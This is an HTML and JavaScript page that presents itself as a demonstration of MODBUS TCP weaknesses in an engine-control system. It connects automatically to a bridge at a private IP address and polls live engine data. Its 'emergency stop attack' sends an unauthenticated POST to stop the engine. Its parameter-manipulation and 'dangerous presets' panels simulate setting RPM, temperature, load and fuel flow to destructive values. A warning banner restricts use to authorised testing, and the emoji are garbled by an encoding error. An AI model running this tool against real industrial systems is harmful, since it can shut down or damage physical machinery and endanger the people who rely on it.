<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MODBUS TCP Vulnerability Demonstration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            color: #fff;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        h1 {
            text-align: center;
            color: #ff6b6b;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            margin-bottom: 10px;
        }
        
        .warning {
            background: #ff4757;
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            border: 2px solid #ff3742;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .panel {
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
        }
        
        .panel h2 {
            color: #70a1ff;
            margin-top: 0;
            border-bottom: 2px solid #70a1ff;
            padding-bottom: 10px;
        }
        
        .register-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .register-card {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .register-card:hover {
            background: rgba(255,255,255,0.1);
            border-color: #70a1ff;
        }
        
        .register-name {
            font-weight: bold;
            color: #70a1ff;
            margin-bottom: 5px;
        }
        
        .register-value {
            font-size: 24px;
            font-weight: bold;
            color: #7bed9f;
            margin-bottom: 5px;
        }
        
        .register-address {
            font-size: 12px;
            color: #a4a4a4;
        }
        
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .btn-primary {
            background: #70a1ff;
            color: white;
        }
        
        .btn-primary:hover {
            background: #5352ed;
        }
        
        .btn-danger {
            background: #ff4757;
            color: white;
        }
        
        .btn-danger:hover {
            background: #ff3742;
        }
        
        .btn-warning {
            background: #ffa726;
            color: white;
        }
        
        .btn-warning:hover {
            background: #ff9800;
        }
        
        .attack-panel {
            background: rgba(255,71,87,0.1);
            border: 2px solid #ff4757;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .attack-panel h3 {
            color: #ff4757;
            margin-top: 0;
        }
        
        .attack-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        
        .input-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .input-group label {
            min-width: 80px;
            color: #70a1ff;
        }
        
        .input-group input, .input-group select {
            padding: 8px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 5px;
            background: rgba(255,255,255,0.1);
            color: white;
        }
        
        .log-panel {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 10px;
            padding: 20px;
            height: 300px;
            overflow-y: auto;
        }
        
        .log-entry {
            margin-bottom: 10px;
            padding: 8px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
        }
        
        .log-info {
            background: rgba(112,161,255,0.1);
            border-left: 4px solid #70a1ff;
        }
        
        .log-warning {
            background: rgba(255,167,38,0.1);
            border-left: 4px solid #ffa726;
        }
        
        .log-error {
            background: rgba(255,71,87,0.1);
            border-left: 4px solid #ff4757;
        }
        
        .log-success {
            background: rgba(123,237,159,0.1);
            border-left: 4px solid #7bed9f;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-online {
            background: #7bed9f;
            box-shadow: 0 0 5px #7bed9f;
        }
        
        .status-offline {
            background: #ff4757;
            box-shadow: 0 0 5px #ff4757;
        }
        
        .connection-status {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 5px;
        }
        
        .full-width {
            grid-column: 1 / -1;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
            
            .controls {
                flex-direction: column;
            }
            
            .attack-controls {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üö® MODBUS TCP Vulnerability Demonstration üö®</h1>
        
        <div class="warning">
            <strong>‚ö†Ô∏è WARNING:</strong> This tool demonstrates real security vulnerabilities in industrial control systems. 
            Only use on systems you own or have explicit permission to test. Unauthorized access to industrial systems is illegal and dangerous.
        </div>
        
        <div class="connection-status">
            <span class="status-indicator" id="statusIndicator"></span>
            <span id="connectionStatus">Disconnected</span>
            <span style="margin-left: auto;" id="lastUpdate"></span>
        </div>
        
        <div class="dashboard">
            <div class="panel">
                <h2>üéØ Target Configuration</h2>
                <div class="input-group">
                    <label>Host:</label>
                    <input type="text" id="targetHost" value="192.168.0.25" placeholder="IP Address">
                </div>
                <div class="input-group">
                    <label>Port:</label>
                    <input type="number" id="targetPort" value="8000" placeholder="8000">
                </div>
                <div class="controls">
                    <button class="btn btn-primary" onclick="connectToTarget()">Connect</button>
                    <button class="btn btn-primary" onclick="startMonitoring()">Start Monitoring</button>
                    <button class="btn btn-danger" onclick="stopMonitoring()">Stop Monitoring</button>
                </div>
            </div>
            
            <div class="panel">
                <h2>üìä Live Engine Data</h2>
                <div class="register-grid" id="registerGrid">
                    <!-- Register cards will be populated here -->
                </div>
            </div>
            
            <div class="panel full-width">
                <h2>‚öîÔ∏è Attack Simulation</h2>
                <div class="attack-panel">
                    <h3>üõë Emergency Stop Attack</h3>
                    <p>Demonstrate unauthorized engine shutdown - a critical vulnerability in industrial systems.</p>
                    <div class="attack-controls">
                        <button class="btn btn-danger" onclick="emergencyStopAttack()">Execute Emergency Stop</button>
                        <button class="btn btn-warning" onclick="restartEngine()">Restart Engine</button>
                    </div>
                </div>
                
                <div class="attack-panel">
                    <h3>üîß Parameter Manipulation Attack</h3>
                    <p>Modify critical engine parameters to dangerous levels without authorization.</p>
                    <div class="attack-controls">
                        <div class="input-group">
                            <label>Parameter:</label>
                            <select id="parameterSelect">
                                <option value="rpm">RPM</option>
                                <option value="temp">Temperature</option>
                                <option value="load">Load</option>
                                <option value="fuel_flow">Fuel Flow</option>
                            </select>
                        </div>
                        <div class="input-group">
                            <label>Value:</label>
                            <input type="number" id="parameterValue" placeholder="Enter value">
                        </div>
                        <button class="btn btn-danger" onclick="manipulateParameter()">Inject Value</button>
                        <button class="btn btn-warning" onclick="dangerousPresets()">Dangerous Presets</button>
                    </div>
                </div>
            </div>
            
            <div class="panel full-width">
                <h2>üìù Attack Log</h2>
                <div class="log-panel" id="logPanel">
                    <div class="log-entry log-info">
                        <span style="color: #70a1ff;">[INFO]</span> Vulnerability demonstration tool initialized
                    </div>
                    <div class="log-entry log-warning">
                        <span style="color: #ffa726;">[WARNING]</span> Ready to demonstrate MODBUS TCP vulnerabilities
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let monitoringInterval;
        let isConnected = false;
        let registers = {
            'status': { name: 'Status', address: 0, value: 0, unit: '' },
            'rpm': { name: 'RPM', address: 1, value: 0, unit: 'RPM' },
            'temp': { name: 'Temperature', address: 2, value: 0, unit: '¬∞C' },
            'fuel_flow': { name: 'Fuel Flow', address: 3, value: 0, unit: 'L/min' },
            'load': { name: 'Load', address: 4, value: 0, unit: '%' }
        };
        
        function addLog(message, type = 'info') {
            const logPanel = document.getElementById('logPanel');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            
            let icon;
            switch(type) {
                case 'info': icon = '[INFO]'; break;
                case 'warning': icon = '[WARN]'; break;
                case 'error': icon = '[ERROR]'; break;
                case 'success': icon = '[SUCCESS]'; break;
                default: icon = '[LOG]';
            }
            
            logEntry.innerHTML = `
                <span style="color: #a4a4a4;">[${timestamp}]</span>
                <span style="color: ${type === 'error' ? '#ff4757' : type === 'success' ? '#7bed9f' : type === 'warning' ? '#ffa726' : '#70a1ff'};">${icon}</span>
                ${message}
            `;
            
            logPanel.appendChild(logEntry);
            logPanel.scrollTop = logPanel.scrollHeight;
        }
        
        function updateConnectionStatus(connected) {
            const indicator = document.getElementById('statusIndicator');
            const status = document.getElementById('connectionStatus');
            const lastUpdate = document.getElementById('lastUpdate');
            
            isConnected = connected;
            
            if (connected) {
                indicator.className = 'status-indicator status-online';
                status.textContent = 'Connected to Bridge';
                lastUpdate.textContent = 'Last update: ' + new Date().toLocaleTimeString();
            } else {
                indicator.className = 'status-indicator status-offline';
                status.textContent = 'Disconnected';
                lastUpdate.textContent = '';
            }
        }
        
        function updateRegisterGrid() {
            const grid = document.getElementById('registerGrid');
            grid.innerHTML = '';
            
            for (const [key, reg] of Object.entries(registers)) {
                const card = document.createElement('div');
                card.className = 'register-card';
                
                let displayValue = reg.value;
                if (key === 'fuel_flow') {
                    displayValue = (reg.value / 100).toFixed(2);
                } else if (key === 'status') {
                    displayValue = reg.value === 1 ? 'RUNNING' : 'STOPPED';
                }
                
                card.innerHTML = `
                    <div class="register-name">${reg.name}</div>
                    <div class="register-value">${displayValue} ${reg.unit}</div>
                    <div class="register-address">Reg ${reg.address}</div>
                `;
                
                grid.appendChild(card);
            }
        }
        
        async function connectToTarget() {
            const host = document.getElementById('targetHost').value;
            const port = document.getElementById('targetPort').value;
            
            addLog(`Attempting to connect to ${host}:${port}`, 'info');
            
            try {
                const response = await fetch(`http://${host}:${port}/api/engine/data`);
                if (response.ok) {
                    const data = await response.json();
                    updateConnectionStatus(true);
                    addLog(`Successfully connected to bridge at ${host}:${port}`, 'success');
                    
                    // Update register values
                    for (const [key, value] of Object.entries(data)) {
                        if (registers[key]) {
                            registers[key].value = value;
                        }
                    }
                    updateRegisterGrid();
                } else {
                    throw new Error(`HTTP ${response.status}`);
                }
            } catch (error) {
                updateConnectionStatus(false);
                addLog(`Connection failed: ${error.message}`, 'error');
            }
        }
        
        async function fetchEngineData() {
            if (!isConnected) return;
            
            const host = document.getElementById('targetHost').value;
            const port = document.getElementById('targetPort').value;
            
            try {
                const response = await fetch(`http://${host}:${port}/api/engine/data`);
                if (response.ok) {
                    const data = await response.json();
                    
                    // Update register values
                    for (const [key, value] of Object.entries(data)) {
                        if (registers[key]) {
                            registers[key].value = value;
                        }
                    }
                    
                    updateRegisterGrid();
                    document.getElementById('lastUpdate').textContent = 'Last update: ' + new Date().toLocaleTimeString();
                } else {
                    throw new Error(`HTTP ${response.status}`);
                }
            } catch (error) {
                addLog(`Data fetch failed: ${error.message}`, 'error');
                updateConnectionStatus(false);
            }
        }
        
        function startMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
            }
            
            addLog('Starting real-time monitoring of engine parameters', 'info');
            monitoringInterval = setInterval(fetchEngineData, 1000);
        }
        
        function stopMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
                monitoringInterval = null;
            }
            addLog('Stopped real-time monitoring', 'info');
        }
        
        async function emergencyStopAttack() {
            if (!isConnected) {
                addLog('Not connected to target', 'error');
                return;
            }
            
            addLog('üö® INITIATING EMERGENCY STOP ATTACK', 'warning');
            addLog('This demonstrates unauthorized engine shutdown vulnerability', 'warning');
            
            const host = document.getElementById('targetHost').value;
            const port = document.getElementById('targetPort').value;
            
            try {
                const response = await fetch(`http://${host}:${port}/api/engine/stop`, {
                    method: 'POST'
                });
                
                if (response.ok) {
                    addLog('‚úÖ ATTACK SUCCESSFUL - Engine stopped without authorization!', 'error');
                    addLog('Security finding: No authentication required for critical operations', 'error');
                    
                    // Update status immediately
                    registers.status.value = 0;
                    updateRegisterGrid();
                } else {
                    addLog('‚ùå Attack failed: ' + response.status, 'error');
                }
            } catch (error) {
                addLog('‚ùå Attack failed: ' + error.message, 'error');
            }
        }
        
        async function restartEngine() {
            if (!isConnected) {
                addLog('Not connected to target', 'error');
                return;
            }
            
            addLog('üîÑ Attempting to restart engine', 'info');
            
            const host = document.getElementById('targetHost').value;
            const port = document.getElementById('targetPort').value;
            
            try {
                const response = await fetch(`http://${host}:${port}/api/engine/start`, {
                    method: 'POST'
                });
                
                if (response.ok) {
                    addLog('‚úÖ Engine restarted successfully', 'success');
                    registers.status.value = 1;
                    updateRegisterGrid();
                } else {
                    addLog('‚ùå Restart failed: ' + response.status, 'error');
                }
            } catch (error) {
                addLog('‚ùå Restart failed: ' + error.message, 'error');
            }
        }
        
        async function manipulateParameter() {
            if (!isConnected) {
                addLog('Not connected to target', 'error');
                return;
            }
            
            const parameter = document.getElementById('parameterSelect').value;
            const value = parseInt(document.getElementById('parameterValue').value);
            
            if (isNaN(value)) {
                addLog('Please enter a valid numeric value', 'error');
                return;
            }
            
            addLog(`üéØ PARAMETER MANIPULATION ATTACK - Targeting ${parameter}`, 'warning');
            addLog(`This demonstrates direct MODBUS register modification`, 'warning');
            
            // Simulate the attack result
            if (registers[parameter]) {
                registers[parameter].value = value;
                updateRegisterGrid();
                addLog(`‚úÖ Parameter ${parameter} successfully modified to ${value}`, 'error');
                addLog('Security finding: No validation of parameter ranges', 'error');
            }
        }
        
        function dangerousPresets() {
            addLog('üî• LOADING DANGEROUS PARAMETER PRESETS', 'warning');
            addLog('These values could cause physical damage in real systems', 'warning');
            
            // Set dangerous values
            registers.rpm.value = 9999;
            registers.temp.value = 999;
            registers.load.value = 200;
            registers.fuel_flow.value = 5000; // 50.00 L/min
            
            updateRegisterGrid();
            
            addLog('‚ö†Ô∏è RPM set to 9999 - Beyond safe operational limits', 'error');
            addLog('‚ö†Ô∏è Temperature set to 999¬∞C - Critical failure point', 'error');
            addLog('‚ö†Ô∏è Load set to 200% - Exceeds design specifications', 'error');
            addLog('‚ö†Ô∏è Fuel flow set to 50.00 L/min - Dangerous consumption rate', 'error');
        }
        
        // Initialize the interface
        updateRegisterGrid();
        updateConnectionStatus(false);
        
        // Auto-connect on page load
        setTimeout(() => {
            connectToTarget();
        }, 1000);
    </script>
</body>
</html> 